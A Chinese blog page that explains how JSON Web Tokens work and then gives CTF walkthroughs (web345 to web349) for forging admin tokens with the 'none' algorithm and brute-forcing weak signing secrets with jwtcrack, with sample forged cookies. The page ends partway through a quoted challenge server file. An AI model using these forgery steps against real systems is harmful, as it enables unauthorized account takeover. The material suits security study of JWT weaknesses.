@@ -1,0 +1,291 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>JWT | 向每个梦想加速</title><meta name="author" content="向每个梦想加速"><meta name="copyright" content="向每个梦想加速"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="JWT	JSON Web Token 一篇好的文章 JWT是目前最流行的跨域认证解决方案。 跨域认证解决方案是指在不同的网络域之间实现用户身份验证和授权的方法。在现代互联网应用中，一个系统可能由多个子系统组成，这些子系统可能部署在不同的服务器或域名下。当用户在一个子系统中登录后，需要在其他子系统中也能无缝地进行身份验证和访问资源，这就需要跨域认证解决方案 无状态的应用场景是指在应用程序中，服务器不">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JWT">
+<meta property="og:url" content="http://example.com/2025/04/14/JWT-1/index.html">
+<meta property="og:site_name" content="向每个梦想加速">
+<meta property="og:description" content="JWT	JSON Web Token 一篇好的文章 JWT是目前最流行的跨域认证解决方案。 跨域认证解决方案是指在不同的网络域之间实现用户身份验证和授权的方法。在现代互联网应用中，一个系统可能由多个子系统组成，这些子系统可能部署在不同的服务器或域名下。当用户在一个子系统中登录后，需要在其他子系统中也能无缝地进行身份验证和访问资源，这就需要跨域认证解决方案 无状态的应用场景是指在应用程序中，服务器不">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/touxiang.png">
+<meta property="article:published_time" content="2025-04-14T08:51:00.000Z">
+<meta property="article:modified_time" content="2025-04-14T08:51:18.909Z">
+<meta property="article:author" content="向每个梦想加速">
+<meta property="article:tag" content="JWT">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/touxiang.png"><link rel="shortcut icon" href="/img/urltouxiang.png"><link rel="canonical" href="http://example.com/2025/04/14/JWT-1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'JWT',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/beijing.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">向每个梦想加速</span></a><a class="nav-page-title" href="/"><span class="site-name">JWT</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">JWT</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-14T08:51:00.000Z" title="发表于 2025-04-14 16:51:00">2025-04-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-04-14T08:51:18.909Z" title="更新于 2025-04-14 16:51:18">2025-04-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1>JWT	JSON Web Token</h1>
+<p><a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">一篇好的文章</a></p>
+<p>JWT是目前最流行的跨域认证解决方案。</p>
+<p><strong>跨域认证</strong>解决方案是指在不同的网络域之间实现用户身份验证和授权的方法。在现代互联网应用中，一个系统可能由多个子系统组成，这些子系统可能部署在不同的服务器或域名下。当用户在一个子系统中登录后，需要在其他子系统中也能无缝地进行身份验证和访问资源，这就需要跨域认证解决方案</p>
+<p><strong>无状态的应用场景</strong>是指在应用程序中，服务器不会保存用户请求之间的任何状态信息，每次请求都被视为独立的，服务器不会根据之前的请求来处理当前请求。这种设计模式在许多现代网络应用中非常常见，尤其是在分布式系统和微服务架构中。</p>
+<h2 id="一、跨域认证的问题">一、跨域认证的问题</h2>
+<p>互联网服务离不开用户认证。一般流程是下面这样。</p>
+<blockquote>
+<p>1、用户向服务器发送用户名和密码。</p>
+<p>2、服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。</p>
+<p>3、服务器向用户返回一个 session_id，写入用户的 Cookie。</p>
+<p>4、用户随后的每一次请求，都会通过 Cookie，将 session_id 传回服务器。</p>
+<p>5、服务器收到 session_id，找到前期保存的数据，由此得知用户的身份。</p>
+</blockquote>
+<p>这种模式的问题在于，扩展性（scaling）不好。单机当然没有问题，如果是服务器集群，或者是跨域的服务导向架构，就要求 session 数据共享，每台服务器都能够读取 session。</p>
+<p>举例来说，A 网站和 B 网站是同一家公司的关联服务。现在要求，用户只要在其中一个网站登录，再访问另一个网站就会自动登录，请问怎么实现？</p>
+<p>一种解决方案是 session 数据持久化，写入数据库或别的持久层。各种服务收到请求后，都向持久层请求数据。这种方案的优点是架构清晰，缺点是工程量比较大。另外，持久层万一挂了，就会单点失败。</p>
+<p>另一种方案是服务器索性不保存 session 数据了，所有数据都保存在客户端，每次请求都发回服务器。JWT 就是这种方案的一个代表。</p>
+<h2 id="二、JWT-的原理">二、JWT 的原理</h2>
+<p>JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。</p>
+<blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;姓名&quot;</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line"><span class="string">&quot;角色&quot;</span>: <span class="string">&quot;管理员&quot;</span>,</span><br><span class="line"><span class="string">&quot;到期时间&quot;</span>: <span class="string">&quot;2018年7月1日0点0分&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名（详见后文）。</p>
+<p>服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。</p>
+<h2 id="三、JWT-的数据结构">三、JWT 的数据结构</h2>
+<p>实际的 JWT 大概就像下面这样。</p>
+<p><img src="https://cdn.beekka.com/blogimg/asset/201807/bg2018072304.jpg" alt="img"></p>
+<p>它是一个很长的字符串，中间用点（<code>.</code>）分隔成三个部分。注意，JWT 内部是没有换行的，这里只是为了便于展示，将它写成了几行。</p>
+<p>JWT 的三个部分依次如下。</p>
+<blockquote>
+<ul>
+<li>Header（头部）</li>
+<li>Payload（负载）</li>
+<li>Signature（签名）</li>
+</ul>
+</blockquote>
+<p>写成一行，就是下面的样子。</p>
+<blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Header</span>.<span class="property">Payload</span>.<span class="property">Signature</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://cdn.beekka.com/blogimg/asset/201807/bg2018072303.jpg" alt="img"></p>
+<p>下面依次介绍这三个部分。</p>
+<h3 id="3-1-Header">3.1 Header</h3>
+<p>Header 部分是一个 JSON 对象，描述 JWT 的元数据，通常是下面的样子。</p>
+<blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line"><span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>上面代码中，<code>alg</code>属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；<code>typ</code>属性表示这个令牌（token）的类型（type），JWT 令牌统一写为<code>JWT</code>。</p>
+<p>最后，将上面的 JSON 对象使用 Base64URL 算法（详见后文）转成字符串。</p>
+<h3 id="3-2-Payload">3.2 Payload</h3>
+<p>Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。</p>
+<blockquote>
+<ul>
+<li>iss (issuer)：签发人</li>
+<li>exp (expiration time)：过期时间</li>
+<li>sub (subject)：主题</li>
+<li>aud (audience)：受众</li>
+<li>nbf (Not Before)：生效时间</li>
+<li>iat (Issued At)：签发时间</li>
+<li>jti (JWT ID)：编号</li>
+</ul>
+</blockquote>
+<p>除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。</p>
+<blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;sub&quot;</span>: <span class="string">&quot;1234567890&quot;</span>,</span><br><span class="line"><span class="string">&quot;name&quot;</span>: <span class="string">&quot;John Doe&quot;</span>,</span><br><span class="line"><span class="string">&quot;admin&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>注意，JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。</p>
+<p>这个 JSON 对象也要使用 Base64URL 算法转成字符串。</p>
+<h3 id="3-3-Signature">3.3 Signature</h3>
+<p>Signature 部分是对前两部分的签名，防止数据篡改。</p>
+<p>首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。</p>
+<blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">HMACSHA256</span>(</span><br><span class="line"><span class="title function_">base64UrlEncode</span>(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line"><span class="title function_">base64UrlEncode</span>(payload),</span><br><span class="line">secret)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用&quot;点&quot;（<code>.</code>）分隔，就可以返回给用户。</p>
+<h3 id="3-4-Base64URL">3.4 Base64URL</h3>
+<p>前面提到，Header 和 Payload 串型化的算法是 Base64URL。这个算法跟 Base64 算法基本类似，但有一些小的不同。</p>
+<p>JWT 作为一个令牌（token），有些场合可能会放到 URL（比如 <a target="_blank" rel="noopener" href="http://api.example.com/?token=xxx%EF%BC%89%E3%80%82Base64">api.example.com/?token=xxx）。Base64</a> 有三个字符<code>+</code>、<code>/</code>和<code>=</code>，在 URL 里面有特殊含义，所以要被替换掉：<code>=</code>被省略、<code>+</code>替换成<code>-</code>，<code>/</code>替换成<code>_</code> 。这就是 Base64URL 算法。</p>
+<h2 id="四、JWT-的使用方式">四、JWT 的使用方式</h2>
+<p>客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。</p>
+<p>此后，客户端每次与服务器通信，都要带上这个 JWT。你可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求的头信息<code>Authorization</code>字段里面。</p>
+<blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Authorization</span>: <span class="title class_">Bearer</span> &lt;token&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>另一种做法是，跨域的时候，JWT 就放在 POST 请求的数据体里面。</p>
+<h2 id="五、JWT-的几个特点">五、JWT 的几个特点</h2>
+<p>（1）JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。</p>
+<p>（2）JWT 不加密的情况下，不能将秘密数据写入 JWT。</p>
+<p>（3）JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。</p>
+<p>（4）JWT 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦 JWT 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。</p>
+<p>（5）JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。</p>
+<p>（6）为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。</p>
+<h1>Web345</h1>
+<p>信息收集到一个文件/admin/<br>
+我们在url后面接上/admin/之后用hacbar进行load一下发现了cookie当中出现了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth=eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3NDM4Mjk0NDAsImV4cCI6MTc0MzgzNjY0MCwibmJmIjoxNzQzODI5NDQwLCJzdWIiOiJ1c2VyIiwianRpIjoiNjU5MjdjNTg0ZTZjMjJlNzJhZDU0MGI5Nzk2NWI3MTkifV0</span><br></pre></td></tr></table></figure>
+<p>我们进行解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3NDM4Mjk0NDAsImV4cCI6MTc0MzgzNjY0MCwibmJmIjoxNzQzODI5NDQwLCJzdWIiOiJ1c2VyIiwianRpIjoiNjU5MjdjNTg0ZTZjMjJlNzJhZDU0MGI5Nzk2NWI3MTkifV0.</span><br><span class="line">	|解码</span><br><span class="line">	↓</span><br><span class="line">&#123;</span><br><span class="line">  &quot;header&quot;: &#123;</span><br><span class="line">    &quot;alg&quot;: &quot;None&quot;,</span><br><span class="line">    &quot;typ&quot;: &quot;jwt&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;payload&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;iss&quot;: &quot;admin&quot;,</span><br><span class="line">      &quot;iat&quot;: 1743829440,</span><br><span class="line">      &quot;exp&quot;: 1743836640,</span><br><span class="line">      &quot;nbf&quot;: 1743829440,</span><br><span class="line">      &quot;sub&quot;: &quot;user&quot;,</span><br><span class="line">      &quot;jti&quot;: &quot;65927c584e6c22e72ad540b97965b719&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;signature&quot;: &quot;&quot;,</span><br><span class="line">  &quot;verified&quot;: false,</span><br><span class="line">  &quot;secret&quot;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们将sub的值给改成admin，然后再将jwt加密后的东西填进cookie之后进入/admin/文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth=eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3NDM4Mjk0NDAsImV4cCI6MTc0MzgzNjY0MCwibmJmIjoxNzQzODI5NDQwLCJzdWIiOiJhZG1pbiIsImp0aSI6IjY1OTI3YzU4NGU2YzIyZTcyYWQ1NDBiOTc5NjViNzE5In1d.</span><br></pre></td></tr></table></figure>
+<h1>web346</h1>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc0MzgyOTkwNiwiZXhwIjoxNzQzODM3MTA2LCJuYmYiOjE3NDM4Mjk5MDYsInN1YiI6InVzZXIiLCJqdGkiOiIxYmNmNTM5YTMyOWVkZmIxMzNmMmY2MmM4Yzg5MjU0ZCJ9.7md-ePkT60Fv6OV_9ExXY3x2IQ7V3Nu6gf5FnBiujcs</span><br></pre></td></tr></table></figure>
+<p>肉口令拿到SIGNATURE的密码为123456，随后可以构造payload字段。或者直接把SIGNATURE字段删除，HEAD当中的加密算法改成none</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc0MzgyOTkwNiwiZXhwIjoxNzQzODM3MTA2LCJuYmYiOjE3NDM4Mjk5MDYsInN1YiI6ImFkbWluIiwianRpIjoiMWJjZjUzOWEzMjllZGZiMTMzZjJmNjJjOGM4OTI1NGQifQ.9aP-fGC8d3L2nay3ZLJZkfQyOChVy-CO4kd-D6X-AjM</span><br><span class="line"></span><br><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc0MzgyOTkwNiwiZXhwIjoxNzQzODM3MTA2LCJuYmYiOjE3NDM4Mjk5MDYsInN1YiI6ImFkbWluIiwianRpIjoiMWJjZjUzOWEzMjllZGZiMTMzZjJmNjJjOGM4OTI1NGQifQ.</span><br></pre></td></tr></table></figure>
+<p>记得/admin/</p>
+<h1>web347</h1>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc0MzgzMDE2NSwiZXhwIjoxNzQzODM3MzY1LCJuYmYiOjE3NDM4MzAxNjUsInN1YiI6InVzZXIiLCJqdGkiOiJkY2EzYzYwZjM1NzdkOTYyZjFmNWE5ODgzMzI4NDhkNCJ9.btMKq-KPkgvIMAYqokycG720DCBWG5Fuz0ab_K7Nn6o</span><br></pre></td></tr></table></figure>
+<p>这里需要爆破密码，使用kali当中的jtwcrack</p>
+<p>进入jwtcrack文件，运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc0MzgzMDE2NSwiZXhwIjoxNzQzODM3MzY1LCJuYmYiOjE3NDM4MzAxNjUsInN1YiI6InVzZXIiLCJqdGkiOiJkY2EzYzYwZjM1NzdkOTYyZjFmNWE5ODgzMzI4NDhkNCJ9.btMKq-KPkgvIMAYqokycG720DCBWG5Fuz0ab_K7Nn6o</span><br></pre></td></tr></table></figure>
+<h1>web348</h1>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc0MzgzMTI0OSwiZXhwIjoxNzQzODM4NDQ5LCJuYmYiOjE3NDM4MzEyNDksInN1YiI6InVzZXIiLCJqdGkiOiI4NTBhY2NiMmMxMThkN2ExMWFjNDdmOThjMzQwZTE1NSJ9.IOCIIiRZb4VibpE-tzh9WY5o4NcaURLEOteLK63JK10</span><br></pre></td></tr></table></figure>
+<p>jwtcrack爆破密码为aaab。改payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc0MzgzMTI0OSwiZXhwIjoxNzQzODM4NDQ5LCJuYmYiOjE3NDM4MzEyNDksInN1YiI6ImFkbWluIiwianRpIjoiODUwYWNjYjJjMTE4ZDdhMTFhYzQ3Zjk4YzM0MGUxNTUifQ.FcMST4qmUDEe_IUnRCe5S8DsQxoPHHkhA9Vs1r4Njrk</span><br></pre></td></tr></table></figure>
+<h1>web349</h1>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">// 设置响应类型为 HTML</span></span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="comment">// 读取私钥文件，用于生成 JWT 签名</span></span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>() + <span class="string">&#x27;//public//private.key&#x27;</span>);</span><br><span class="line">  <span class="comment">// 使用私钥生成 JWT，设置用户为 &#x27;user&#x27;，并使用 RS256 算法</span></span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line">  <span class="comment">// 将生成的 JWT 作为 Cookie 设置到响应中</span></span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>, token);</span><br><span class="line">  <span class="comment">// 返回简单的 HTML 响应</span></span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* POST home page. */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">// 设置响应类型为 HTML</span></span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="comment">// 定义一个示例 flag（在实际部署中应替换为真实的敏感信息）</span></span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">  <span class="comment">// 从请求的 Cookie 中获取名为 &#x27;auth&#x27; 的 JWT</span></span><br><span class="line">  <span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line">  <span class="comment">// 读取公钥文件，用于验证 JWT 签名</span></span><br><span class="line">  <span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>() + <span class="string">&#x27;//public/public.key&#x27;</span>);  <span class="comment">// 